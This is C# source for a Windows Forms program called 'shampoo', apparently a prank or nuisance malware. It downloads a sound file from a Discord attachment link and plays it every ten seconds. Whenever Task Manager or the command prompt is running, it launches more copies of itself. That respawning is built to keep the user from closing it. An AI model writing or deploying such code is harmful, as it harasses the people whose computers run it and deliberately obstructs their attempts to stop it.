using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Media;
using System.Net;
using System.Windows.Forms;

namespace shampoo
{
    public partial class Form1 : Form
    {
        SoundPlayer simpleSound = new SoundPlayer(Path.GetTempPath() + "\\shampoo.wav");
        Process[] pname = Process.GetProcessesByName("taskmgr");
        int x = 1;

        public Form1()
        {
            WebClient webClient = new WebClient();
            Uri shampoos = new Uri("https://cdn.discordapp.com/attachments/966780583600619594/967199545928859699/shampoo.wav", UriKind.Absolute);
            webClient.DownloadFile(shampoos, Path.GetTempPath() + "\\shampoo.wav");
            InitializeComponent();
            this.KeyPreview = true;
            simpleSound.Play();
            timer1 = new Timer();
            timer1.Tick += new EventHandler(timer1_Tick);
            timer1.Interval = 10000;
            timer1.Start();
        }

        void timer1_Tick(object sender, EventArgs e)
        {
            simpleSound.Play();

            pname = Process.GetProcessesByName("taskmgr");
            if (pname.Length == 0) { }
            else
                Process.Start(AppDomain.CurrentDomain.BaseDirectory + "\\shampoo.exe");

            pname = Process.GetProcessesByName("cmd");
            if (pname.Length == 0) { }
            else
                Process.Start(AppDomain.CurrentDomain.BaseDirectory + "\\shampoo.exe");

        }


    }
}
